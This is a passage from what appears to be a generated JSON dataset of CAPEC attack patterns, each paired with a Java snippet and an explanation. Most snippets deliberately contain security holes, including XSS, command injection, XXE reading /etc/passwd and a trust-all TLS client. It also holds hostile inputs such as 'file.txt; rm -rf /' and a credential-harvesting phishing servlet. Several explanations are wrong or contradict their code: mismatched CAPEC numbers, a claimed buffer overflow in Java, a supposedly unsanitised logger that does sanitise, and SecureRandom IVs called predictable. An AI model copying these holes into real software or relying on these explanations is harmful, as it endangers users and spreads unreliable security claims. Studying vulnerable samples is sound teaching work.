        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableHeaderServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String referer = request.getHeader(\"Referer\");\n        \n        // Vulnerable code: directly using the Referer header without validation\n        response.getWriter().println(\"<a href='\" + referer + \"'>Click here</a>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where an HTTP header (Referer) is used directly in the generation of a web page without proper validation or neutralization. This can lead to Cross-Site Scripting (XSS) attacks if an attacker controls the Referer header. The code snippet highlights the risk described in CAPEC-202, where unvalidated HTTP headers are used to generate web content, potentially allowing XSS attacks. The related CWEs (CWE-80, CWE-79, CWE-644, CWE-82, CWE-692) provide additional context on the types of improper neutralization that can lead to such vulnerabilities."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"role\") == null || !session.getAttribute(\"role\").equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n            return;\n        }\n        response.getWriter().println(\"Welcome to the admin page!\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a basic implementation of access control for an admin page. The servlet checks if the user has an active session and if the session contains an attribute 'role' with the value 'admin'. If these conditions are not met, the servlet responds with a 403 Forbidden status, denying access to the page. This snippet embodies the concept of 'Forceful Browsing' (CAPEC-111) by showing how an attacker might attempt to access restricted areas of a web application directly via URL. The code also addresses related CWEs such as CWE-425 (Direct Request), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure) by ensuring that proper authorization checks are in place before granting access to sensitive resources."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        try {\n            // Vulnerable code: using untrusted input to build a command string\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an OS Command Injection vulnerability. The program takes a filename as a command-line argument and constructs a command string to display the contents of the file using the 'cat' command. The filename input is not validated or sanitized, allowing an attacker to inject arbitrary OS commands. For example, an attacker could provide a filename like 'file.txt; rm -rf /' to execute a malicious command. This code embodies the main idea of CAPEC-88 and related CWEs, such as CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerablePharmingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/updates/latest.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            // Simulate executing downloaded code\n            System.out.println(\"Downloaded content: \" + content.toString());\n\n            // CWE-346: Origin Validation Error\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            String trustedHost = \"trustedbank.com\";\n            URL bankUrl = new URL(\"http://\" + trustedHost + \"/login\");\n            HttpURLConnection bankConnection = (HttpURLConnection) bankUrl.openConnection();\n            bankConnection.setRequestMethod(\"GET\");\n            BufferedReader bankIn = new BufferedReader(new InputStreamReader(bankConnection.getInputStream()));\n            String bankInputLine;\n            StringBuilder bankContent = new StringBuilder();\n            while ((bankInputLine = bankIn.readLine()) != null) {\n                bankContent.append(bankInputLine);\n            }\n            bankIn.close();\n            bankConnection.disconnect();\n\n            // Simulate user entering sensitive data into a spoofed site\n            System.out.println(\"Bank login page content: \" + bankContent.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario related to pharming attacks. The code first downloads an update from a remote location without verifying its integrity (CWE-494). This could allow an attacker to inject malicious code. Then, it attempts to access a supposedly trusted bank login page using a hardcoded hostname (CWE-346 and CWE-350). If an attacker has manipulated DNS settings, the user could be redirected to a malicious site that looks like the trusted bank site, leading to a pharming attack. The code does not perform proper origin validation or DNS resolution checks, making it susceptible to such attacks."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ReflectionAttackExample {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n\n        // Send challenge to server\n        String challenge = \"AUTH_REQUEST\";\n        out.writeUTF(challenge);\n\n        // Receive response from server\n        String response = in.readUTF();\n\n        // Reflect the response back to the server\n        out.writeUTF(response);\n\n        // Check if authentication is successful\n        String authResult = in.readUTF();\n        if (\"AUTH_SUCCESS\".equals(authResult)) {\n            System.out.println(\"Authentication bypassed via reflection attack.\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a reflection attack on an authentication protocol. The client sends an authentication request to the server and receives a challenge response. Instead of processing the challenge correctly, the client reflects the response back to the server. If the server incorrectly accepts this reflected response as valid, the client gains unauthorized access. This example highlights vulnerabilities such as reflection attacks (CWE-301), incorrect implementation of authentication algorithms (CWE-303), and potential for authentication bypass (CWE-290)."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + userInput + \"' />\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to CAPEC-18: XSS Targeting Non-Script Elements, specifically within the context of IMG tags (CWE-82). The servlet takes user input from a request parameter and directly inserts it into the src attribute of an IMG tag without proper neutralization. This can lead to Cross-Site Scripting (XSS) attacks if an attacker provides a malicious input such as '\" onerror=\"alert('XSS')\"'. The code also highlights issues related to CWE-80 (Basic XSS), CWE-87 (Alternate XSS Syntax), and CWE-692 (Incomplete Denylist), as it does not properly sanitize or validate the user input, making it susceptible to various XSS attack vectors."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "public class ForcedIntegerOverflow {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int[] buffer = new int[10];\n\n        // Simulate user-controlled input that causes overflow\n        int userInput = maxValue + 1; // This will cause an overflow\n\n        // Incorrectly using the overflowed value as an array index\n        try {\n            buffer[userInput] = 1; // This will throw ArrayIndexOutOfBoundsException\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught an exception: \" + e.getMessage());\n        }\n\n        // Incorrect memory allocation due to overflow\n        int size = userInput * 4; // This will cause an integer overflow\n        try {\n            int[] largeBuffer = new int[size]; // This may cause a heap-based buffer overflow\n        } catch (OutOfMemoryError e) {\n            System.out.println(\"Caught an exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a forced integer overflow scenario. The code simulates a user-controlled input that causes an integer overflow by adding 1 to Integer.MAX_VALUE, resulting in a negative value due to wraparound. This overflowed value is then incorrectly used as an array index, leading to an ArrayIndexOutOfBoundsException. Additionally, the overflowed value is used to calculate the size for memory allocation, which can lead to a heap-based buffer overflow. This example embodies the main idea of the CAPEC by showing how an attacker can manipulate integer values to cause unexpected behavior and potential vulnerabilities in the system."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class LogInjectionExample {\n    private static final Logger logger = Logger.getLogger(LogInjectionExample.class.getName());\n\n    public static void main(String[] args) {\n        String userInput = \"User input with malicious content \\n[INFO] User logged in\";\n        logUserAction(userInput);\n    }\n\n    public static void logUserAction(String message) {\n        try (FileWriter fw = new FileWriter(\"app.log\", true)) {\n            // CWE-117: Improper Output Neutralization for Logs\n            // CWE-75: Failure to Sanitize Special Elements into a Different Plane\n            // CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n            String sanitizedMessage = message.replaceAll(\"[\\n\\r]\", \"_\");\n            fw.write(sanitizedMessage + \"\\n\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Failed to write to log file\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that is susceptible to log injection attacks. The `logUserAction` method writes user input directly to a log file without proper sanitization, allowing an attacker to inject malicious log entries. The code attempts to sanitize the input by replacing newline characters, but it may not be sufficient to neutralize all special elements. This example highlights the importance of proper input sanitization (CWE-75, CWE-150) and output neutralization (CWE-117) to prevent log injection and tampering. Additionally, it underscores the risk of inserting sensitive information into logs (CWE-532) and logging excessive data (CWE-779)."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import javax.net.ssl.*;\nimport java.io.*;\nimport java.net.Socket;\n\npublic class VulnerableSSLClient {\n    public static void main(String[] args) throws Exception {\n        // Create an SSL context with default settings\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, new TrustManager[]{new X509TrustManager() {\n            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }\n            public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }\n        }}, new java.security.SecureRandom());\n\n        // Create a socket connection to the server\n        SSLSocketFactory factory = sslContext.getSocketFactory();\n        SSLSocket socket = (SSLSocket) factory.createSocket(\"example.com\", 443);\n\n        // Start handshake\n        socket.startHandshake();\n\n        // Send a simple HTTP request\n        PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())));\n        out.println(\"GET / HTTP/1.1\");\n        out.println(\"Host: example.com\");\n        out.println(\"\");\n        out.flush();\n\n        // Read the response\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            System.out.println(inputLine);\n        }\n\n        // Close the streams and socket\n        in.close();\n        out.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SSL client that fails to properly verify the server's identity, making it susceptible to an Adversary in the Middle (AiTM) attack. The SSL context is initialized with a TrustManager that does not perform any checks on the server's certificate, allowing an attacker to intercept and manipulate the communication. This embodies CWE-300 (Channel Accessible by Non-Endpoint) and CWE-287 (Improper Authentication), as the client does not adequately verify the server's identity, allowing an adversary to place themselves within the communication channel."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import javax.xml.ws.Service;\nimport javax.xml.namespace.QName;\nimport java.net.URL;\n\npublic class WSDLScanner {\n    public static void main(String[] args) {\n        try {\n            // URL of the WSDL file\n            URL wsdlURL = new URL(\"http://example.com/service?wsdl\");\n            // QName of the service\n            QName qname = new QName(\"http://example.com/\", \"ExampleService\");\n            // Create a service instance\n            Service service = Service.create(wsdlURL, qname);\n            // Access the service's port\n            ExampleService exampleService = service.getPort(ExampleService.class);\n            // Invoke a method with potentially malicious input\n            String response = exampleService.someMethod(\"<malicious>input</malicious>\");\n            System.out.println(\"Response: \" + response);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\ninterface ExampleService {\n    String someMethod(String input);\n}",
        "description": "This Java code snippet demonstrates a basic WSDL scanning attack. The code accesses a WSDL file from a given URL, creates a service instance, and invokes a method on the service with potentially malicious input. This embodies the main idea of CAPEC-111 (WSDL Scanning), where an attacker scans the WSDL interface to reveal sensitive information and potentially exploit vulnerabilities. The code also touches on related CWEs, such as CWE-651 (Exposure of WSDL File Containing Sensitive Information) by accessing the WSDL file, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by potentially sending sensitive information in the request."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        try {\n            // Attempt to load a third-party library\n            System.loadLibrary(\"thirdPartyLib\");\n            // Use a function from the third-party library\n            ThirdPartyLib.doSomething();\n        } catch (UnsatisfiedLinkError e) {\n            // Improper error handling\n            System.out.println(\"Library not found, continuing execution...\");\n        }\n\n        // Simulate further operations that assume the library is loaded\n        try {\n            File file = new File(\"/path/to/file\");\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[1024];\n            int bytesRead = fis.read(data);\n            // Potential buffer overflow\n            while (bytesRead != -1) {\n                // Process data\n                bytesRead = fis.read(data);\n            }\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ThirdPartyLib {\n    public static void doSomething() {\n        // Placeholder for third-party library function\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that attempts to load and use a third-party library. If the library is not found, the application catches the UnsatisfiedLinkError but continues execution without proper error handling, potentially leaving the system in an insecure state. Additionally, the code includes a file reading operation that could lead to a buffer overflow (CWE-119) if not properly managed. This snippet embodies the main idea of CAPEC-212 (Block Access to Libraries) and incorporates related weaknesses such as CWE-589 (Call to Non-ubiquitous API) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import java.security.SecureRandom;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.IvParameterSpec;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Use of a broken or risky cryptographic algorithm (CWE-327)\n        String algorithm = \"DES\"; // DES is considered broken and insecure\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Generation of weak initialization vector (IV) (CWE-1204)\n        byte[] iv = new byte[8]; // DES block size is 8 bytes\n        SecureRandom random = new SecureRandom();\n        random.nextBytes(iv); // IV is not sufficiently unpredictable\n        IvParameterSpec ivSpec = new IvParameterSpec(iv);\n\n        // Use of a cryptographic primitive with a risky implementation (CWE-1240)\n        Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);\n\n        String plaintext = \"Sensitive Data\";\n        byte[] ciphertext = cipher.doFinal(plaintext.getBytes());\n\n        System.out.println(\"Ciphertext: \" + new String(ciphertext));\n    }\n}",
        "description": "This Java code snippet demonstrates several cryptographic vulnerabilities as described in the CAPEC and related CWEs. The code uses the DES algorithm, which is considered broken and insecure (CWE-327). It generates a weak initialization vector (IV) that is not sufficiently unpredictable (CWE-1204). Additionally, it uses a cryptographic primitive with a risky implementation by using DES in CBC mode with PKCS5 padding (CWE-1240). The code aims to highlight how improper use of cryptographic algorithms and poor implementation practices can lead to vulnerabilities that can be exploited through cryptanalysis."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/phish\")\npublic class PhishingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"url\");\n        if (redirectUrl != null && !redirectUrl.isEmpty()) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.getWriter().println(\"<html><body>\");\n            response.getWriter().println(\"<h1>Login</h1>\");\n            response.getWriter().println(\"<form method='POST' action='/phish'>\");\n            response.getWriter().println(\"Username: <input type='text' name='username'><br>\");\n            response.getWriter().println(\"Password: <input type='password' name='password'><br>\");\n            response.getWriter().println(\"<input type='submit' value='Login'>\");\n            response.getWriter().println(\"</form>\");\n            response.getWriter().println(\"</body></html>\");\n        }\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n        // Simulate storing credentials (in reality, this would be sent to an attacker)\n        System.out.println(\"Phished credentials: \" + username + \", \" + password);\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Login Successful</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a basic phishing attack. The servlet has two main functionalities: 1) It can redirect users to a URL specified by the 'url' parameter, which is an example of CWE-601 (URL Redirection to Untrusted Site). 2) It presents a fake login form to the user, capturing the entered credentials and printing them to the console, which simulates a phishing attack by collecting sensitive information (CWE-451, CWE-506, CWE-507, and CWE-512). The code is designed to mislead users into thinking they are logging into a legitimate service, thereby revealing their confidential information."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" +\n                          \"<!DOCTYPE root [<!ENTITY ext SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                          \"<root>&ext;</root>\";\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Improper Restriction of XML External Entity Reference (CWE-611)\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(\"Parsed XML: \" + document.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to an XML External Entity (XXE) attack, which is a type of XML Parser Attack. The code does not properly restrict XML external entity references (CWE-611), allowing an attacker to include external entities in the XML input. In this example, the XML input contains a DOCTYPE declaration that defines an external entity referencing the file '/etc/passwd'. When the XML is parsed, the content of '/etc/passwd' is included in the parsed output, which can lead to sensitive information disclosure. The code also lacks proper XML validation against a schema (CWE-112), which could prevent such attacks by ensuring the XML structure adheres to expected formats."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        String filePath = \"input.txt\";\n        char[] buffer = new char[10]; // Small buffer size\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            int charsRead = reader.read(buffer, 0, 50); // Attempt to read more than buffer size\n            System.out.println(\"Read \" + charsRead + \" characters.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability. The buffer is allocated with a fixed size of 10 characters, but the code attempts to read up to 50 characters from a file into this buffer. This can lead to a buffer overflow as the code does not check if the input size exceeds the buffer size. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableSSIServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: directly including user input in the response\n        out.println(\"<!--#include file='\" + userInput + \"' -->\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Server Side Include (SSI) Injection vulnerability. The servlet takes a user input from the request parameter 'input' and directly includes it in the response using an SSI directive. This can allow an attacker to inject malicious SSI directives, leading to arbitrary code execution or information disclosure. The code does not properly neutralize or validate the user input (CWE-97, CWE-20), and it constructs part of the response using externally-influenced input without neutralizing special elements (CWE-74)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableSessionSidejacking {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n\n        String urlParameters = \"username=user&password=pass\"; // CWE-522: Insufficiently Protected Credentials\n        DataOutputStream wr = new DataOutputStream(connection.getOutputStream());\n        wr.writeBytes(urlParameters);\n        wr.flush();\n        wr.close();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        StringBuffer response = new StringBuffer();\n\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n\n        String sessionToken = connection.getHeaderField(\"Set-Cookie\"); // CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n        System.out.println(\"Session Token: \" + sessionToken);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a login process that is susceptible to session sidejacking. The code sends login credentials in cleartext over an unencrypted HTTP connection (CWE-319, CWE-522). The session token is retrieved from the response headers without the 'Secure' attribute, making it possible for an attacker to sniff the token and perform session hijacking (CWE-614). This example highlights the risks associated with transmitting sensitive information over unencrypted channels and the importance of securing session tokens."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class ClickjackingVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome to the vulnerable page</h1>\");\n        response.getWriter().println(\"<p>Click the button below to proceed</p>\");\n        response.getWriter().println(\"<button onclick=\\\"window.location.href='http://malicious-site.com'\\\">Click me</button>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a basic example of a clickjacking vulnerability. The servlet generates an HTML page with a button that, when clicked, redirects the user to a malicious site. This embodies the main idea of CAPEC-103 (Clickjacking), where an adversary tricks a user into performing an unintended action. The code does not include any frame-busting techniques or X-Frame-Options headers, making it susceptible to being embedded in an iframe on a malicious site. This aligns with CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), as the application does not restrict frame objects, leading to potential user confusion and exploitation."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class CrossZoneScriptingExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String zone = request.getParameter(\"zone\");\n\n        // CWE-20: Improper Input Validation\n        if (zone == null || (!zone.equals(\"trusted\") && !zone.equals(\"untrusted\"))) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid zone\");\n            return;\n        }\n\n        // CWE-116: Improper Encoding or Escaping of Output\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Zone: \" + zone + \"</h1>\");\n        response.getWriter().println(\"<p>Input: \" + userInput + \"</p>\"); // No encoding or escaping\n        response.getWriter().println(\"</body></html>\");\n\n        // CWE-250: Execution with Unnecessary Privileges\n        if (zone.equals(\"trusted\")) {\n            executeWithHighPrivileges(userInput);\n        }\n    }\n\n    private void executeWithHighPrivileges(String input) {\n        // Simulate execution with high privileges\n        System.out.println(\"Executing with high privileges: \" + input);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross Zone Scripting vulnerability. The servlet processes user input and a zone parameter, which can be either 'trusted' or 'untrusted'. The code fails to properly validate the user input (CWE-20) and does not encode or escape the output (CWE-116), allowing for potential script injection. Additionally, if the zone is 'trusted', the code executes with higher privileges than necessary (CWE-250), which can lead to privilege escalation. This snippet embodies the main idea of CAPEC-160 by showing how an attacker could exploit zone-based security controls to execute malicious scripts with elevated privileges."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable code: does not neutralize CRLF sequences\n        response.setHeader(\"X-User-Input\", userInput);\n        response.getWriter().println(\"Header set with user input: \" + userInput);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Request Splitting (CAPEC-33) by improperly handling user input in HTTP headers. The code retrieves a parameter from the HTTP request without neutralizing CRLF sequences (CWE-113), allowing an attacker to inject malicious headers. This can lead to HTTP Request Smuggling (CWE-444) and other injection-related issues (CWE-74, CWE-138). The servlet sets a response header using untrusted user input, which can be exploited to manipulate HTTP requests and responses, causing security issues in intermediary HTTP agents."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/log\")\npublic class LogServlet extends HttpServlet {\n    private static final Logger logger = Logger.getLogger(LogServlet.class.getName());\n\n    static {\n        try {\n            FileHandler fh = new FileHandler(\"app.log\", true);\n            fh.setFormatter(new SimpleFormatter());\n            logger.addHandler(fh);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        logger.info(\"User input: \" + userInput);\n        response.getWriter().write(\"Logged user input.\");\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerability where user input is logged without proper sanitization, leading to potential Cross-Site Scripting (XSS) attacks through log files. The servlet captures user input from an HTTP POST request and logs it directly. If an attacker submits a malicious script as input, it could be stored in the log file and potentially executed when the log is viewed in certain contexts. This example embodies the deprecated CAPEC pattern 'XSS through Log Files' and highlights CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-693: Protection Mechanism Failure\n        // Allowing TRACE method which can be exploited for XST\n        if (request.getMethod().equalsIgnoreCase(\"TRACE\")) {\n            response.setStatus(HttpServletResponse.SC_METHOD_NOT_ALLOWED);\n            response.getWriter().write(\"TRACE method is not allowed\");\n            return;\n        }\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation\n        String userInput = request.getParameter(\"input\");\n        response.getWriter().write(\"User input: \" + userInput);\n    }\n\n    protected void doTrace(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-648: Incorrect Use of Privileged APIs\n        // Incorrectly allowing TRACE method which can expose sensitive information\n        response.setStatus(HttpServletResponse.SC_OK);\n        response.getWriter().write(\"TRACE method is allowed\");\n    }\n}",
